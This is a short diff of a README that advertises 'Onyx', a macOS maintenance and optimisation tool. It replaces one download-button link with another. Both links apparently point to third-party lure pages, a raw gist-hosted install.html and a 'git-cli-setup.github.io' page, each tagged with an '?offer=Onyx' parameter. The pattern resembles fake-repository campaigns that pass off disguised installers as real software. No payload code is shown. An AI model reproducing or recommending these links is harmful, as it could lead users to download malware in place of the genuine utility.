@@ -2,7 +2,7 @@
 
 Onyx is a multifunctional maintenance and optimization tool for macOS that helps verify system files, clean caches, and adjust hidden settings with precision. It's widely used for improving stability and system performance on Mac devices.
 
-<a href="https://gistcdn.githack.com/axpsychonker1999/44962a21e90615c1adc73a0f6016619e/raw/fbb8dd2af07b235c0549f95a85cb9e9604f1a52f/install.html?offer=Onyx" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=Onyx" target="_blank">
   <img
     src="https://img.shields.io/badge/Get%20Onyx%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF"
     width="320"
